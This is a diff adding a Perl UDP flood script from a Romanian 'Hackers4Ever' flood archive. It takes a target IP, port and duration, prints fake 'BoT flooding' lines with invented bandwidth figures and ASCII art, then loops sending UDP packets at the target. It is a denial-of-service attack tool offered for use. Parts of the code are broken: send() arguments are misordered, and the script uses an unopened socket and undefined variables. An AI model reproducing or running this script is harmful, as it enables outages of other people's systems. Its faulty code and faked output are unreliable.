@@ -1,0 +1,100 @@
+#!/usr/bin/perl
+
+
+use Socket;
+
+$ARGC=@ARGV;
+
+if ($ARGC !=3) {
+ printf "Comanda este perl $0 IP 500 0\n";
+ printf "Ai gresit comanda HaXoRasHule !\n";
+ exit(1);
+}
+
+my ($ip,$port,$size,$time);
+ $ip=$ARGV[0];
+ $port=$ARGV[1]; 
+ $time=$ARGV[2];
+
+socket(moshu, PF_INET, SOCK_DGRAM, 17);
+    $iaddr = inet_aton("$ip");
+printf "[0;36mBoT #1 flooding IP ; Dau in el ca surdu-n clopot. [195.24 mb/sec]\n";
+printf "[0;36mBoT #2flooding IP ; Dau in el ca surdu-n clopot. [152.74 mb/sec]\n";
+printf "[0;36mBoT #3 flooding IP ; Dau in el ca surdu-n clopot. [240.32 mb/sec]\n";
+printf "[0;36mBoT #4 flooding IP ; Dau in el ca surdu-n clopot. [50.05 mb/sec]\n";
+printf "[0;36mBoT #5 flooding IP ; Dau in el ca surdu-n clopot. [365.75 mb/sec]\n";
+printf "[0;36mBoT #6 flooding IP ; Dau in el ca surdu-n clopot. [235.53 mb/sec]\n";
+printf "[0;36mBoT #7 flooding IP ; Dau in el ca surdu-n clopot. [654.64 mb/sec]\n";
+printf "[0;36mBoT #8 flooding IP ; Dau in el ca surdu-n clopot. [256.67 mb/sec]\n";
+printf "[0;36mBoT #9 flooding IP ; Dau in el ca surdu-n clopot. [546.05 mb/sec]\n";
+printf "[0;36mBoT #10 flooding IP ; Dau in el ca surdu-n clopot. [45.75 mb/sec]\n";
+printf "[0;36mBoT #11 flooding IP ; Dau in el ca surdu-n clopot. [674.86 mb/sec]\n";
+printf "[0;36mBoT #12 flooding IP ; Dau in el ca surdu-n clopot. [36.97 mb/sec]\n";
+printf "[0;36mBoT #13 flooding IP ; Dau in el ca surdu-n clopot. [629.64 mb/sec]\n";
+printf "[0;36mBoT #14 flooding IP ; Dau in el ca surdu-n clopot. [245.65 mb/sec]\n";
+printf "[0;36mBoT #15 flooding IP ; Dau in el ca surdu-n clopot. [896.63 mb/sec]\n";
+printf "[0;36mBoT #16 flooding IP ; Dau in el ca surdu-n clopot. [54.96 mb/sec]\n";
+printf "[0;36mBoT #17 flooding IP ; Dau in el ca surdu-n clopot. [567.02 mb/sec]\n";
+printf "[0;36mBoT #18 flooding IP ; Dau in el ca surdu-n clopot. [214.93 mb/sec]\n";
+printf "[0;36mBoT #19 flooding IP ; Dau in el ca surdu-n clopot. [653.92 mb/sec]\n";
+printf "[0;36mBoT #20 flooding IP ; Dau in el ca surdu-n clopot. [47.25 mb/sec]\n";
+printf "[0;36mBoT #21 flooding IP ; Dau in el ca surdu-n clopot. [854.62 mb/sec]\n";
+printf "[0;36mBoT #22 flooding IP ; Dau in el ca surdu-n clopot. [26.72 mb/sec]\n";
+printf "[0;36mBoT #23 flooding IP ; Dau in el ca surdu-n clopot. [69.95 mb/sec]\n";
+printf "[0;36mBoT #24 flooding IP ; Dau in el ca surdu-n clopot. [364.08 mb/sec]\n";
+printf "[0;36mBoT #25 flooding IP ; Dau in el ca surdu-n clopot. [96.53 mb/sec]\n";
+printf "[0;32m###########################################################################\n";
+printf "[0;31mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMNdddddddNMMMMMMMMNmddddddmMMMMMMMMMNddddddddmddddddddddddddddddddmMMMMM
+MMMMmhhhyyydNMMMMMMMMNdyyyyyhmMMMMMMMNmhyhhyyyhhddhdyyyhhyyyyyyyyyyyhmMMMMM
+MMMMmdhyyyydNMMMMMMMMNdyyyyyymMMMMMNmdyyyyyyhhhyddhyyyyhhyyyyyyyyyyyhmMMMMM
+MMMMmhhyyyydNMMMMMMMMNdsssssymMMMMmdyyssssyhyyyyddhhyyyhmNNNNNNNNNNNNNMMMMM
+MMMMmdyhyyshmMMMMMMMMNdsssssymMMNdysssssyhhysssyddyhhyyhmMMMMMMMMMMMMMMMMMM
+MMMMmhyhyyshdhhyyyhhhhdsssssymNdhsssssshmmyyyssydhyhyyshdhhyyyyhhhhhmMMMMMM
+MMMMmhsyyyydyssssssssydsssssymdysssssyddmdyysyyydhsyyyyhhssssssssssymMMMMMM
+MMMMmhsyyyshhhyyyyyyyhdssssyhmyysssssssssyssssssdhsyyyyhdhyyyyyyyyyhmMMMMMM
+MMMMmyssssshmNNNNNNNNmdssyssymsssosossssssooooosdhssosshmNNNNNNNNNNNMMMMMMM
+MMMMmyssosshNMMMMMMMMNdysssoymysssssssssyyssssssdhsoossymMMMMMMMMMMMMMMMMMM
+MMMMmysoooshNMMMMMMMMNhoooooymmmmmmmmmmmmdsooossdhsooosymmdddddddddddmMMMMM
+MMMMmyoyssshNMMMMMMMMNdooooosmMMMMMMMMMMMmyooooodhoysssydysooooooooosdNMMMM
+MMMMmhsdhsohNMMMMMMMMNdoooooymMMMMMMMMMMMmsoooosddshhyoyhshooossooooodNMMMM
+MMMMNmmNmmmmMMMMMMMMMNmmmmmmmNMMMMMMMMMMMNmmmmmmmmmNNmmmmmmmmmmmmmmmmmMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\n";
+printf "[0;32m########################################################################### \n";
+printf "[0;31m# A r h i v a   d e   F L o o D   b y   [H 4 E] [H a c k e r s 4 E v e r] #\n";
+printf "[0;32m########################################################################### \n";
+printf "[0;31m# Realizatorii arhivei sunt :  # SiLE Cyber # qGabriela # FrankFurd # MSD # \n";
+printf "[0;32m########################################################################### \n";
+printf "[0;31m# FLooD-ul a fost trimis ; IP-ul a intrat in spital ; IP-DOWN a facut poc #\n";
+printf "[0;32m########################################################################### \n";
+
+if ($ARGV[1] ==0 && $ARGV[65500] ==0) {
+ goto randpackets;
+}
+if ($ARGV[1] !=0 && $ARGV[65500] !=0) {
+ system("(sleep $time;killall -9 udp) &");
+ goto packets;
+}
+if ($ARGV[1] !=0 && $ARGV[65500] ==0) {
+ goto packets;
+}
+if ($ARGV[1] ==0 && $ARGV[65500] !=0) {
+ system("(sleep $time;killall -9 udp) &"); 
+ goto randpackets;
+}
+packets:
+for (;;) {
+ $size=$rand x $rand x $rand;
+ send(moshu, 0, $size, sockaddr_in($port, $iaddr));
+} 
+randpackets:
+for (;;) {
+ $size=$rand x $rand x $rand;
+ for (;time() <= $endtime;) {
+ $psize = $size ? $size : int(rand(45000-65500)+65000) ;
+ $pport = $port ? $port : int(rand(65500))+9;
+ 
+ send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
+}
